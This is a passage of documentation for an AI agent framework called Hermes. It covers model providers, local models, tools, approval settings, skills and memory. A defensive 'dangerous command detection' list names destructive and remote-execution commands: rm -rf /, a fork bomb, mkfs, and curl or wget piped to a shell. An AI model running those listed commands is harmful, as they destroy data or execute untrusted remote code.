| Provider | Models | Status | Best For |
|----------|--------|--------|----------|
| **OpenRouter** | 200+ models | ✓ Full support | Beginners, cost-effective |
| **OpenAI** | GPT-5, GPT-4o, o1, Codex | ✓ Full support | Production, reliability |
| **Anthropic** | Claude 3.7, 3.5 Sonnet/Opus | ✓ Full support | Long context, coding |
| **Google** | Gemini 2.0, 1.5 Pro/Flash | ✓ Full support | Multimodal, speed |
| **xAI** | Grok-3, Grok-2 | ✓ Native support | X/Twitter integration |
| **DeepSeek** | DeepSeek-R1, V3 | ✓ Full support | Reasoning, coding |
| **Qwen** | Qwen 3.6, 2.5 | ✓ Full support | Coding, multilingual |
| **MiniMax** | Various | ✓ Full support | Chinese language |
| **Kimi/Moonshot** | Various | ✓ Full support | Long context |
| **GLM (z.ai)** | GLM-4, GLM-Zero | ✓ Full support | Chinese, coding |
| **Hugging Face** | Open models | ✓ Full support | Self-hosted |
| **Nous Portal** | Nous models | ✓ Full support | Nous ecosystem |
| **AWS Bedrock** | Various | ✓ Full support | Enterprise AWS |
| **Azure AI Foundry** | Various | ✓ Full support | Enterprise Azure |
| **LM Studio** | Local models | ✓ Full support | Local development |
| **Ollama** | Local models | ✓ Full support | Privacy, offline |
| **Custom** | Any OpenAI-compatible | ✓ Full support | Self-hosted |
| **AI/ML API** | Various | ✓ Built-in preset | Aggregated access |

### **Using OpenRouter (Recommended for Beginners)**

**Why OpenRouter:**

- **200+ models** in one place
- **Free models available** (no cost for light usage)
- **Automatic routing** to best available model
- **Single API key** for all models
- **Cost-effective** pay-as-you-go pricing

**Getting Started:**

1. **Get API Key:**
   - Go to [OpenRouter.ai](https://openrouter.ai)
   - Sign up (free)
   - Create API key
   - Copy key (starts with `sk-or-`)

2. **Configure Hermes:**

```bash
hermes config set model.provider openrouter
hermes config set OPENROUTER_API_KEY sk-or-xxx
```

1. **Choose a Model:**

**Free Models:**

```bash
# Auto-routing to free models (recommended)
hermes config set model.default openrouter/free

# Specific free models:
hermes config set model.default google/gemini-2.0-flash-thinking-exp-01-21:free
hermes config set model.default deepseek/deepseek-r1:free
hermes config set model.default google/gemini-2.0-flash-exp:free
hermes config set model.default qwen/qwq-32b-preview:free
```

**Paid Models (Cost-Effective):**

```bash
# Best value
hermes config set model.default google/gemini-flash-1.5  # ~$0.10/1M tokens

# High performance
hermes config set model.default anthropic/claude-3.5-sonnet  # ~$3/1M tokens
hermes config set model.default openai/gpt-4o  # ~$2.5/1M tokens
```

1. **Switch Models During Chat:**

```
/model openrouter/deepseek/deepseek-r1:free
/model openrouter/free
/model openrouter/anthropic/claude-3.7-sonnet
```

1. **Scan for Free Models:**

```bash
hermes model --list --free-only
```

**Rate Limits on Free Models:**

- Usually 10-20 requests per minute
- May have daily caps
- Slower during peak hours
- Can be removed without notice

**Cost-Saving Strategy:**

Use `openrouter/auto` as your primary. It automatically routes:

- **Simple tasks** → cheap models (Gemini Flash, etc.)
- **Complex tasks** → capable models (Claude, GPT-4, etc.)

```yaml
model:
  provider: openrouter
  default: openrouter/auto
```

### **Using Local Models with Ollama**

**Why Ollama:**

- **Complete privacy** - everything stays on your machine
- **No API costs** - free to run (just electricity)
- **Offline operation** - no internet required
- **Full control** - no rate limits, no usage tracking

**Hardware Requirements:**

| Model Size | RAM | VRAM (GPU) | Disk Space |
|------------|-----|------------|------------|
| 7B | 16 GB | 6 GB | 5 GB |
| 13B | 24 GB | 10 GB | 10 GB |
| 32B | 32 GB | 20 GB | 19 GB |
| 70B | 64 GB | 48 GB | 40 GB |

**Installation:**

**Mac:**

```bash
brew install ollama
```

**Linux:**

```bash
curl -fsSL https://ollama.com/install.sh | sh
```

**Windows:**
Download installer from [ollama.com](https://ollama.com)

**Start Ollama:**

```bash
ollama serve
# Runs on http://127.0.0.1:11434
```

**Pull Models:**

```bash
# Best for Hermes (strong tool calling, 32B)
ollama pull qwen2.5-coder:32b

# Alternative options:
ollama pull deepseek-r1:32b   # Strong reasoning
ollama pull llama3.3:70b      # Most capable (needs powerful hardware)
ollama pull qwen3:8b          # Lightweight but capable
ollama pull mistral:7b        # Lightweight for testing
ollama pull gemma4            # Reasoning and code
```

**Connect Ollama to Hermes:**

**Automatic Method (Easiest):**

```bash
ollama launch hermes
```

This handles everything:

- Installs Hermes if needed
- Configures Ollama provider
- Points Hermes at `http://127.0.0.1:11434/v1`
- Sets your chosen model as primary

**Manual Configuration:**

Edit `~/.hermes/config.yaml`:

```yaml
model:
  provider: custom
  base_url: http://127.0.0.1:11434/v1
  default: qwen2.5-coder:32b
```

Set API key (any value works for local):

```bash
hermes config set OPENAI_API_KEY "ollama-local"
```

**Advanced Configuration:**

```yaml
model:
  provider: custom
  base_url: http://127.0.0.1:11434/v1
  default: qwen2.5-coder:32b
  fallbacks:
    - mistral:7b
  models:
    - id: qwen2.5-coder:32b
      name: Qwen 2.5 Coder 32B (Local)
      context_window: 128000
      max_tokens: 8192
```

**Verify:**

```bash
hermes doctor
```

**Recommended Ollama Models:**

| Model | Size | VRAM | Use Case |
|-------|------|------|----------|
| **qwen2.5-coder:32b** | 19 GB | 20 GB | Best tool calling |
| **qwen3.6** | ~24 GB | ~24 GB | Reasoning, coding, visual |
| **gemma4** | ~16 GB | ~16 GB | Reasoning and code |
| **deepseek-r1:32b** | 19 GB | 20 GB | Strong reasoning |
| **llama3.3:70b** | 40 GB | 48 GB | Most capable |
| **qwen3:8b** | 4.7 GB | 6 GB | Lightweight |
| **mistral:7b** | 4.1 GB | 5 GB | Good balance |

**Performance Tips:**

- **GPU acceleration** is 5-10x faster than CPU
- **First response** may be slower (5-10s) as model loads
- Use **smaller models** for testing, **larger** for production
- Use models with **128k+ context** for best results

**Auto-Start Ollama:**

**Mac:**

```bash
brew services start ollama
```

**Linux (systemd):**

```bash
sudo systemctl enable ollama
sudo systemctl start ollama
```

**Cost Reality:**

Local models are free but have electricity costs:

| Model | Power Usage | Cost/Day (24/7 @ $0.12/kWh) |
|-------|-------------|------------------------------|
| 7B on CPU | 50-100W | $0.14-0.29 |
| 32B on GPU | 150-250W | $0.43-0.72 |
| 70B on powerful GPU | 300-400W | $0.86-1.15 |

### **Provider Fallback & Auto-Routing**

Configure automatic failover when primary provider is unavailable:

```yaml
model:
  provider: openrouter
  default: openrouter/free
  fallbacks:
    - google/gemini-2.0-flash-exp:free
    - deepseek/deepseek-r1:free
    - anthropic/claude-3.5-sonnet  # Paid fallback
```

**How It Works:**

1. Hermes tries primary model
2. If API error (rate limit, downtime, etc.), tries first fallback
3. Continues down list until success
4. Returns to primary on next message

**Credential Pools:**

For high-availability setups, configure multiple API keys:

```yaml
providers:
  openrouter:
    api_keys:
      - sk-or-key1
      - sk-or-key2
      - sk-or-key3
    rotation: round_robin  # or failover
```

### **Switching Providers On-the-Fly**

**In CLI:**

```bash
/model anthropic/claude-3.7-sonnet
/model openai/gpt-4o
/model openrouter/free
```

**In Chat:**

```
/model openrouter/deepseek/deepseek-r1:free
```

**Verify Current Model:**

```bash
hermes model
```

---

## **Tools & Toolsets**

### **Tool Architecture Overview**

Hermes includes **73+ built-in tools** organized into **28+ toolsets**. Tools are the agent's ability to interact with the world-executing commands, searching the web, controlling browsers, managing files, and integrating with external services.

**Tool Categories:**

| Category | Count | Description |
|----------|-------|-------------|
| **Core** | 3 | Code execution, clarification, session search |
| **Web** | 4 | Search, extract, snapshot, scrape |
| **Browser** | 10 | Navigate, click, type, screenshot, vision |
| **Terminal & Files** | 8 | Execute commands, read/write/patch files |
| **Media** | 3 | Vision analysis, image generation, TTS |
| **Agent Orchestration** | 4 | Todo, delegate, clarify, execute |
| **Memory & Recall** | 2 | Persistent memory, cross-session search |
| **Automation** | 1 | Cron jobs (create/list/update/pause/resume) |
| **Integrations** | 15+ | Home Assistant, Spotify, Google Meet, etc. |
| **MCP** | Dynamic | Model Context Protocol servers |
| **Platform-Specific** | 20+ | Discord admin, Telegram admin, etc. |

### **Core Toolsets**

**Core Toolset:**

```yaml
core:
  - execute_code    # Run Python code in sandbox
  - clarify         # Ask user for clarification
  - session_search  # Search across past sessions
```

**Web Toolset:**

```yaml
web:
  - web_search      # Search the web (Exa, Parallel, Tavily, Firecrawl)
  - web_extract     # Extract content from URLs
  - web_snapshot    # Take snapshot of web page
  - web_scrape      # Advanced scraping with JS rendering
```

**Browser Toolset:**

```yaml
browser:
  - browser_navigate      # Navigate to URL
  - browser_snapshot      # Take accessibility snapshot
  - browser_vision        # Visual screenshot analysis
  - browser_click         # Click element
  - browser_type          # Type text into field
  - browser_select        # Select dropdown option
  - browser_scroll        # Scroll page
  - browser_wait          # Wait for element
  - browser_evaluate      # Execute JavaScript
  - browser_screenshot    # Take visual screenshot
```

**Terminal & Files Toolset:**

```yaml
terminal:
  - terminal        # Execute shell commands
  - read_file       # Read file contents
  - write_file      # Write file contents
  - patch           # Apply unified diff patches
  - search_files    # Search files with regex
  - list_directory  # List directory contents
  - process         # Manage background processes
  - file_info       # Get file metadata
```

**Media Toolset:**

```yaml
media:
  - vision_analyze      # Analyze images with vision models
  - image_generate      # Generate images (DALL-E, Flux, etc.)
  - text_to_speech      # Convert text to audio
```

**Agent Orchestration Toolset:**

```yaml
orchestration:
  - todo              # Manage task lists
  - clarify           # Ask user for clarification
  - execute_code      # Run Python in sandbox
  - delegate_task     # Spawn subagents for parallel work
```

**Memory & Recall Toolset:**

```yaml
memory:
  - memory            # Read/write persistent memory
  - session_search    # Search across past sessions
```

**Automation Toolset:**

```yaml
automation:
  - cronjob           # Schedule recurring tasks
    # Subcommands:
    # - cronjob create
    # - cronjob list
    # - cronjob update
    # - cronjob pause
    # - cronjob resume
    # - cronjob run
    # - cronjob remove
```

### **Platform-Specific Toolsets**

Hermes includes specialized toolsets for specific platforms:

**Discord Toolset:**

```yaml
discord:
  - discord_send_message
  - discord_edit_message
  - discord_delete_message
  - discord_get_channel_history
  - discord_create_thread
  - discord_add_reaction

discord_admin:
  - discord_ban_user
  - discord_kick_user
  - discord_mute_user
  - discord_manage_roles
  - discord_purge_messages
```

**Telegram Toolset:**

```yaml
telegram:
  - telegram_send_message
  - telegram_edit_message
  - telegram_delete_message
  - telegram_send_photo
  - telegram_send_document
  - telegram_send_poll
  - telegram_pin_message

telegram_admin:
  - telegram_ban_user
  - telegram_unban_user
  - telegram_restrict_user
  - telegram_promote_user
```

**Slack Toolset:**

```yaml
slack:
  - slack_send_message
  - slack_create_channel
  - slack_invite_user
  - slack_upload_file
  - slack_add_reaction
```

### **Integration Toolsets**

**Home Assistant:**

```yaml
homeassistant:
  - ha_get_states         # Get entity states
  - ha_set_state          # Set entity state
  - ha_call_service       # Call HA service
  - ha_get_history        # Get entity history
  - ha_fire_event         # Fire HA event
  - ha_get_config         # Get HA configuration
  - ha_get_areas          # Get areas/zones
  - ha_get_devices        # Get devices
  - ha_get_entities       # Get entities
  - ha_get_automations    # Get automations
  - ha_trigger_automation # Trigger automation
```

**Spotify:**

```yaml
spotify:
  - spotify_play          # Play track/album/playlist
  - spotify_pause         # Pause playback
  - spotify_next          # Skip to next track
  - spotify_previous      # Go to previous track
  - spotify_search        # Search for tracks/artists
  - spotify_get_current   # Get currently playing
  - spotify_set_volume    # Set playback volume
  - spotify_get_playlists # Get user playlists
```

**Google Workspace:**

```yaml
gmail:
  - gmail_list_messages     # List emails
  - gmail_read_message      # Read email content
  - gmail_send_message      # Send email
  - gmail_reply_message     # Reply to email
  - gmail_search_messages   # Search emails
  - gmail_create_draft      # Create draft
  - gmail_delete_message    # Delete email
  - gmail_label_message     # Add/remove labels

calendar:
  - calendar_list_events    # List calendar events
  - calendar_create_event   # Create new event
  - calendar_update_event   # Update existing event
  - calendar_delete_event   # Delete event
  - calendar_get_event      # Get event details
  - calendar_search_events  # Search events

google_meet:
  - google_meet_create      # Create meeting
  - google_meet_get_info    # Get meeting details
  - google_meet_end         # End meeting
```

**Productivity Tools:**

```yaml
todoist:
  - todoist_list_tasks
  - todoist_create_task
  - todoist_update_task
  - todoist_complete_task
  - todoist_delete_task
  - todoist_get_projects

notion:
  - notion_list_pages
  - notion_create_page
  - notion_update_page
  - notion_delete_page
  - notion_search
  - notion_get_database

obsidian:
  - obsidian_list_notes
  - obsidian_read_note
  - obsidian_create_note
  - obsidian_update_note
  - obsidian_search
  - obsidian_get_tags
```

**Development Tools:**

```yaml
git:
  - git_status
  - git_commit
  - git_push
  - git_pull
  - git_branch
  - git_merge
  - git_log
  - git_diff

github:
  - github_list_repos
  - github_create_pr
  - github_review_pr
  - github_merge_pr
  - github_list_issues
  - github_create_issue
  - github_get_ci_status
  - github_deploy
```

### **Using Toolsets**

**Enable/Disable Toolsets:**

```bash
# Configure tools interactively
hermes tools

# Or edit config.yaml
hermes config edit
```

**Platform-Specific Toolsets:**

```yaml
# In config.yaml
toolsets:
  - hermes-cli  # Default for CLI

# Platform overrides
platform_toolsets:
  hermes-telegram:
    - hermes-cli
    - telegram
    - telegram_admin
  hermes-discord:
    - hermes-cli
    - discord
    - discord_admin
  hermes-slack:
    - hermes-cli
    - slack
```

**Disable Toolsets Globally:**

```yaml
agent:
  disabled_toolsets:
    - memory    # No memory tools anywhere
    - web       # No web tools anywhere
    - browser   # No browser automation
```

**Use Specific Toolsets in CLI:**

```bash
hermes chat --toolsets "web,terminal"
hermes chat --toolsets "browser,media"
```

### **Tool Approval & Security**

Configure tools to require approval before execution:

```yaml
tools:
  terminal:
    enabled: true
    require_approval: true  # Every command needs confirmation
    allowed_commands:       # Whitelist safe commands
      - ls
      - pwd
      - cat
      - echo
    blocked_commands:       # Blacklist dangerous commands
      - rm -rf
      - sudo
      - chmod 777
  
  browser:
    enabled: true
    require_approval: false
    allowed_domains:        # Restrict to specific domains
      - github.com
      - stackoverflow.com
  
  filesystem:
    enabled: true
    require_approval: true
    allowed_paths:          # Restrict file access
      - /home/you/Documents
      - /home/you/projects
      - /mnt/data
    blocked_paths:          # Block sensitive paths
      - /etc
      - /root
      - ~/.ssh
```

**Dangerous Command Detection:**

Hermes automatically detects dangerous commands and requires approval:

```python
# Dangerous patterns detected:
- rm -rf /
- sudo rm
- chmod 777
- mkfs
- dd if=/dev/zero
- :(){ :|:& };:  # Fork bomb
- curl | bash
- wget | sh
```

### **Terminal Backends**

The terminal tool can execute commands in different environments for security isolation:

| Backend | Use Case | Security Level |
|---------|----------|----------------|
| `local` | Development, trusted tasks | Low |
| `docker` | Isolated containers | High |
| `ssh` | Remote server execution | Medium |
| `singularity` | HPC containers | High |
| `modal` | Serverless cloud | High |
| `daytona` | Persistent dev environments | Medium |

**Configure Terminal Backend:**

```bash
hermes config set terminal.backend docker
```

**Docker Backend Configuration:**

```yaml
terminal:
  backend: docker
  docker:
    image: python:3.11-slim
    workdir: /workspace
    volumes:
      - /home/user/projects:/workspace/projects
    environment:
      - NODE_ENV=development
    network_mode: bridge  # or none for isolation
```

**SSH Backend Configuration:**

```yaml
terminal:
  backend: ssh
  ssh:
    host: remote-server.example.com
    port: 22
    username: deploy
    key_path: ~/.ssh/id_rsa
    workdir: /opt/app
```

**Modal Backend Configuration:**

```yaml
terminal:
  backend: modal
  modal:
    app_name: hermes-sandbox
    cpu: 2.0
    memory: 4096
    gpu: null  # or "T4", "A10G", etc.
    timeout: 300
```

**Daytona Backend Configuration:**

```yaml
terminal:
  backend: daytona
  daytona:
    workspace_id: ws-xxx
    api_key: ${DAYTONA_API_KEY}
    workdir: /workspace
```

**Singularity Backend Configuration:**

```yaml
terminal:
  backend: singularity
  singularity:
    image: /opt/images/hermes.sif
    workdir: /scratch
    bind:
      - /home/user:/home/user
```

### **Model Context Protocol (MCP)**

MCP allows Hermes to dynamically load tools from external MCP servers:

**Configure MCP Servers:**

```yaml
mcp_servers:
  github:
    command: npx
    args: ["-y", "@modelcontextprotocol/server-github"]
    env:
      GITHUB_TOKEN: ${GITHUB_TOKEN}
  
  filesystem:
    command: npx
    args: ["-y", "@modelcontextprotocol/server-filesystem"]
    config:
      allowed_paths:
        - /home/user/documents
        - /mnt/data
  
  postgres:
    command: npx
    args: ["-y", "@modelcontextprotocol/server-postgres"]
    env:
      DATABASE_URL: postgresql://user:pass@localhost/db
  
  custom-server:
    command: python
    args: ["/path/to/custom/mcp/server.py"]
    env:
      API_KEY: ${CUSTOM_API_KEY}
```

**MCP Tool Discovery:**

Hermes automatically discovers tools from MCP servers and makes them available to the agent. MCP tools are prefixed with the server name:

```
github_list_repos
github_create_pr
filesystem_read_file
postgres_query
```

**MCP Server Lifecycle:**

1. **Startup:** MCP servers are launched when Hermes starts
2. **Handshake:** Hermes negotiates capabilities with each server
3. **Tool Discovery:** Available tools are registered
4. **Execution:** Tool calls are forwarded to MCP server
5. **Shutdown:** Servers are gracefully terminated

---

## **Skills System**

### **What Are Skills?**

Skills are **reusable, programmatic memories** that encode "how to do this thing." They're created automatically after complex tasks (5+ tool calls) or manually by users.

**Skill Structure:**

Each skill is a markdown file with YAML frontmatter:

```markdown
---
name: medical-billing
description: Automate medical billing workflow
version: 1.0.0
author: hermes-agent
created: 2026-02-10
tags:
  - healthcare
  - automation
  - billing
tools_required:
  - web_extract
  - terminal
  - write_file
config:
  emr_endpoint: https://emr.hospital.com/api
---

# Medical Billing Automation

## Overview
This skill automates the medical billing workflow for anesthesiology procedures.

## Workflow
1. Read procedure notes from EMR system
2. Extract CPT codes using pattern matching
3. Generate insurance billing forms
4. Submit to insurance portals
5. Track claim status

## Implementation

### Step 1: Fetch Procedure Notes
```python
import requests

def fetch_procedure_notes(date):
    response = requests.get(
        f"{EMR_ENDPOINT}/procedures",
        params={"date": date},
        headers={"Authorization": f"Bearer {EMR_TOKEN}"}
    )
    return response.json()
```

### Step 2: Extract CPT Codes

```python
import re

def extract_cpt_codes(notes):
    # Common anesthesia CPT codes
    cpt_pattern = r'\b(00[1-9][0-9]{2}|01[1-9][0-9]{2})\b'
    codes = re.findall(cpt_pattern, notes)
    return list(set(codes))
```

### Step 3: Generate Billing Forms

```python
def generate_billing_form(procedure, cpt_codes):
    form = {
        "patient_id": procedure["patient_id"],
        "date_of_service": procedure["date"],
        "cpt_codes": cpt_codes,
        "diagnosis": procedure["diagnosis"],
        "provider_npi": PROVIDER_NPI
    }
    return form
```

### Step 4: Submit to Insurance

```python
def submit_claim(form, insurance_portal):
    # Submit to insurance portal API
    response = requests.post(
        insurance_portal["url"],
        json=form,
        headers={"Authorization": f"Bearer {insurance_portal['token']}"}
    )
    return response.json()
```

## Usage

Ask Hermes: "Process today's procedures and submit billing"

## Configuration

Set in `~/.hermes/config.yaml`:

```yaml
skills:
  config:
    medical-billing:
      emr_endpoint: https://emr.hospital.com/api
      insurance_portals:
        - name: BlueCross
          url: https://bcbs.com/claims
          token: ${BCBS_TOKEN}
```

```

### **Skill Lifecycle**

**1. Creation**

Skills are created automatically after complex tasks:

```

You: Set up a CI/CD pipeline for my GitHub repo
Hermes: [Executes 12 tool calls]
        ✓ Created GitHub Actions workflow
        ✓ Configured deployment
        ✓ Set up environment variables
        ✓ Tested pipeline

        I've created a skill called "github-cicd-setup" based on this workflow.
        I can use it next time you need to set up CI/CD.

```

**2. Storage**

Skills are stored in `~/.hermes/skills/`:

```

~/.hermes/skills/
├── medical-billing.md
├── github-cicd-setup.md
├── email-summarizer.md
└── price-monitor.md

```

**3. Usage**

Hermes automatically applies relevant skills:

```

You: Process today's procedures
Hermes: [Loads medical-billing skill]
        [Executes workflow automatically]
        ✓ Processed 12 procedures
        ✓ Submitted 12 claims
        ✓ Total billed: $8,450

```

**4. Curation (The Curator)**

The Curator automatically maintains skills:

```yaml
curator:
  enabled: true
  review_interval_days: 7
  staleness_threshold_days: 30
  archive_after_days: 90
```

**What The Curator Does:**

- **Tracks Usage:** Monitors how often each skill is used
- **Detects Staleness:** Flags skills unused for 30+ days
- **Archives Old Skills:** Moves unused skills to archive
- **Consolidates Overlaps:** Merges similar skills using LLM
- **Protects Pinned Skills:** Never deletes pinned skills

### **Managing Skills**

**List Installed Skills:**

```bash
hermes skills list
```

**Output:**

```
Installed Skills (12):
  ✓ medical-billing         (used 45 times, last: 2 days ago)
  ✓ github-cicd-setup       (used 12 times, last: 1 week ago)
  ✓ email-summarizer        (used 89 times, last: 1 hour ago)
  ✓ price-monitor           (used 3 times, last: 2 weeks ago)
  ✓ weather-check           (used 156 times, last: 3 hours ago)
  ...

Archived Skills (3):
  • old-skill-1             (archived: 2025-12-01)
  • old-skill-2             (archived: 2025-11-15)
  • old-skill-3             (archived: 2025-10-20)
```

**Install Community Skills:**

```bash
# Browse available skills
hermes skills list --available

# Install a skill
hermes skills install stock-tracker
hermes skills install news-summary
hermes skills install social-media-poster
```

**Enable/Disable Skills:**

```bash
hermes skills enable medical-billing
hermes skills disable old-skill
```

**View Skill Details:**

```bash
hermes skills show medical-billing
```

**Pin Skills (Prevent Auto-Archive):**

```bash
hermes skills pin medical-billing
hermes skills unpin old-skill
```

**Delete Skills:**

```bash
hermes skills delete old-skill
```

### **Bundled Skills Catalog**

Hermes ships with **90+ bundled skills** ready to use:

**Productivity:**

- `email-summary` - Summarize emails
- `calendar-check` - Check calendar
- `todoist-sync` - Sync Todoist tasks
- `notion-search` - Search Notion pages
- `obsidian-notes` - Manage Obsidian notes

**Development:**

- `github-pr-review` - Review pull requests
- `code-reviewer` - Review code quality
- `documentation-generator` - Generate docs
- `api-tester` - Test API endpoints
- `database-migration` - Run DB migrations

**Web & Research:**

- `web-search` - Search the web
- `news-summary` - Summarize news
- `price-monitor` - Monitor prices
- `stock-tracker` - Track stocks
- `weather-check` - Get weather

**Automation:**

- `file-organizer` - Organize files
- `invoice-generator` - Generate invoices
- `blog-post-writer` - Write blog posts
- `social-media-poster` - Post to social media
- `report-generator` - Generate reports

**Smart Home:**

- `homeassistant-routines` - Run HA routines
- `lighting-control` - Control lights
- `thermostat-control` - Control temperature
- `security-check` - Check security status

**Media:**

- `spotify-playlist` - Manage Spotify playlists
- `image-generator` - Generate images
- `video-downloader` - Download videos
- `podcast-summarizer` - Summarize podcasts

### **Optional Skills Hub**

**60+ additional skills** available from the Skills Hub:

```bash
# Search for skills
hermes skills search "medical"

# Install from hub
hermes skills install medical-billing
hermes skills install whoop-integration
hermes skills install fitness-tracker
```

**Popular Optional Skills:**

- `medical-billing` - Medical billing automation
- `whoop-integration` - WHOOP health data
- `fitness-tracker` - Track workouts
- `meal-planner` - Plan meals
- `budget-tracker` - Track expenses
- `investment-analyzer` - Analyze investments
- `travel-planner` - Plan trips
- `language-tutor` - Language learning
- `book-summarizer` - Summarize books
- `research-assistant` - Academic research

### **Creating Custom Skills**

**Manual Skill Creation:**

Create a file in `~/.hermes/skills/`:

```bash
nano ~/.hermes/skills/my-custom-skill.md
```

**Skill Template:**

```markdown
---
name: my-custom-skill
description: Description of what this skill does
version: 1.0.0
author: your-name
created: 2026-02-10
tags:
  - category1
  - category2
tools_required:
  - web_search
  - terminal
config:
  api_endpoint: https://api.example.com
---

# My Custom Skill

## Overview
Description of what this skill does and when to use it.

## Workflow
1. Step 1
2. Step 2
3. Step 3

## Implementation

### Step 1: [Description]
```python
# Code here
```

### Step 2: [Description]

```python
# Code here
```

## Usage

Ask Hermes: "[trigger phrase]"

## Configuration

Set in `~/.hermes/config.yaml`:

```yaml
skills:
  config:
    my-custom-skill:
      api_endpoint: https://api.example.com
      api_key: ${MY_API_KEY}
```

```

**Skill Guard (Security):**

Enable skill guard to scan agent-created skills for dangerous patterns:

```yaml
skills:
  guard_agent_created: true  # Scan for dangerous code
  write_approval: true       # Require approval for skill writes
```

---

## **Memory & Persistence**

### **Memory Architecture**

Hermes uses a **multi-layered memory system** to maintain context across sessions:

```
┌─────────────────────────────────────────────────────────────┐
│                    Memory Layers                              │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  Layer 1: Short-term (Session)                               │
│  ├─ Current conversation context                             │
│  ├─ Tool call history                                        │
│  └─ Temporary variables                                      │
│                                                               │
│  Layer 2: Medium-term (Session Database)                     │
│  ├─ Past conversations (SQLite + FTS5)                       │
│  ├─ Cross-session search                                     │
│  └─ Session lineage tracking                                 │
│                                                               │
│  Layer 3: Long-term (MEMORY.md & USER.md)                    │
│  ├─ User preferences                                         │
│  ├─ Work patterns                                            │
│  ├─ Important facts                                          │
│  └─ Relationship context                                     │
│                                                               │
│  Layer 4: Procedural (Skills)                                │
│  ├─ Reusable workflows                                       │
│  ├─ Problem-solving patterns                                 │
│  └─ Task automation                                          │
│                                                               │
│  Layer 5: External (Memory Providers)                        │
│  ├─ Honcho (dialectic reasoning)                             │
│  ├─ Mem0 (contextual memory)                                 │
│  ├─ Hindsight (past experience)                              │
│  └─ Custom providers                                         │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### **Session Database**

All conversations are stored in SQLite with full-text search:

**Database Location:** `~/.hermes/state.db`

**Schema:**

```sql
-- Sessions table
CREATE TABLE sessions (
  id TEXT PRIMARY KEY,
  platform TEXT,           -- telegram, discord, cli, etc.
  user_id TEXT,
  created_at DATETIME,
  updated_at DATETIME,
  message_count INTEGER,
  token_count INTEGER,
  compressed BOOLEAN,
  parent_session_id TEXT   -- For lineage tracking
);

-- Messages table
CREATE TABLE messages (
  id INTEGER PRIMARY KEY,
  session_id TEXT,
  role TEXT,               -- user, assistant, system, tool
  content TEXT,
  tool_calls TEXT,         -- JSON
  tool_results TEXT,       -- JSON
  created_at DATETIME,
  token_count INTEGER
);

-- Full-text search index
CREATE VIRTUAL TABLE messages_fts USING fts5(
  content,
  content='messages',
  content_rowid='id'
);
```

**Session Management Commands:**

```bash
# List active sessions
hermes session list

# Show session details
hermes session show <session-id>

# Search across all sessions
hermes session search "medical billing"

# Resume a session
hermes session resume <session-id>

# Delete old sessions
hermes session cleanup --older-than 30d
```

### **Long-term Memory (MEMORY.md & USER.md)**

Hermes automatically curates long-term memory in two files:

**MEMORY.md** - General facts and preferences:

```markdown
# Long-term Memory

## User Preferences
- Prefers concise responses
- Uses Python and TypeScript primarily
- Works in DevOps and backend development
- Timezone: PST (UTC-8)

## Work Patterns
- Most active 9 AM - 6 PM PST
- Prefers async communication
- Reviews PRs in the morning

## Important Facts
- Company: Acme Corp
- Team size: 12 developers
- Primary stack: Python, FastAPI, PostgreSQL, Kubernetes
- CI/CD: GitHub Actions

## Communication Style
- Direct and technical
- Appreciates code examples
- Dislikes verbose explanations
```

**USER.md** - User context and relationships:

```markdown
# User Context

## Personal Information
- Name: Mehdi Maleki
- Role: Senior Backend Engineer
- Location: San Francisco, CA

## Team & Relationships
- Manager: Sarah Chen
- Team: Backend Platform Team
- Direct reports: 3 junior developers

## Projects
- Primary: Payment Processing System
- Secondary: Internal API Gateway
- Side project: Open-source CLI tool

## Preferences
- Editor: VS Code
- OS: macOS
- Shell: zsh
- IDE shortcuts: Vim mode
```

**How Memory Is Updated:**

Hermes automatically updates memory when it learns new information:

```
You: I'm based in Seattle now
Hermes: Got it! I'll update your location to Seattle.
        [Updates USER.md with new location]

You: I prefer TypeScript over Python now
Hermes: Noted! I'll remember you prefer TypeScript.
        [Updates MEMORY.md with language preference]
```

**Manual Memory Management:**

```bash
# View memory files
cat ~/.hermes/memories/MEMORY.md
cat ~/.hermes/memories/USER.md

# Edit memory manually
nano ~/.hermes/memories/MEMORY.md

# Clear memory
hermes memory clear

# Export memory
hermes memory export > memory-backup.md

# Import memory
hermes memory import memory-backup.md
```

### **Memory Providers**

Hermes supports external memory providers for advanced use cases:

**Honcho** - AI-native persistent memory with dialectic reasoning:

```yaml
memory:
  provider: honcho
  config:
    api_key: ${HONCHO_API_KEY}
    app_id: ${HONCHO_APP_ID}
    user_id: ${HONCHO_USER_ID}
```

**Features:**

- Dialectic reasoning (contradiction detection)
- Semantic search
- Memory consolidation
- Relationship tracking

**Mem0** - Contextual memory with semantic search:

```yaml
memory:
  provider: mem0
  config:
    api_key: ${MEM0_API_KEY}
    org_id: ${MEM0_ORG_ID}
```

**Features:**

- Vector-based semantic search
- Automatic memory extraction
- Context-aware retrieval

**Hindsight** - Past experience retrieval:

```yaml
memory:
  provider: hindsight
  config:
    api_key: ${HINDSIGHT_API_KEY}
    project_id: ${HINDSIGHT_PROJECT_ID}
```

**Features:**

- Experience-based learning
- Pattern recognition
- Historical context

**Other Providers:**

- **OpenViking** - Open-source memory backend
- **Holographic** - Distributed memory systems
- **RetainDB** - Database-backed memory
- **ByteRover** - File-based memory
- **Supermemory** - Neural memory architectures

### **Context Compression**

Hermes automatically compresses long conversations to stay within context limits:

**How It Works:**

1. **Monitor Context Usage:** Tracks token count vs. model limit
2. **Trigger Compression:** When conversation reaches 50% of context limit
3. **Summarize Old Messages:** Uses auxiliary LLM to summarize early messages
4. **Preserve Recent Context:** Keeps last 20 messages uncompressed
5. **Maintain Continuity:** Preserves key facts and decisions

**Configuration:**

```yaml
compression:
  enabled: true
  threshold: 0.50            # Compress at 50% of context
  target_ratio: 0.20         # Keep 20% as recent tail
  protect_last_n: 20         # Last 20 messages uncompressed
  protect_first_n: 3         # First 3 messages pinned
  hygiene_hard_message_limit: 5000  # Safety valve

# Compression model (optional)
auxiliary:
  compression:
    model: "google/gemini-2.5-flash"  # Cheaper model for compression
    provider: "openrouter"
```

**Compression Example:**

```
Before compression (100 messages, 120k tokens):
[Message 1] [Message 2] ... [Message 100]

After compression (100 messages, 45k tokens):
[Summary of messages 1-80] [Message 81] [Message 82] ... [Message 100]
```

**Manual Compression:**

```bash
# Force compression
hermes compress

# Check compression status
hermes session show <session-id> --verbose
```

---

## **Messaging Gateway**

### **Gateway Architecture**

The gateway is a unified process that connects Hermes to **27+ messaging platforms**:

```
┌──────────────────────────────────────────────────────────────┐
│                    Messaging Gateway                           │
├──────────────────────────────────────────────────────────────┤
│                                                                │
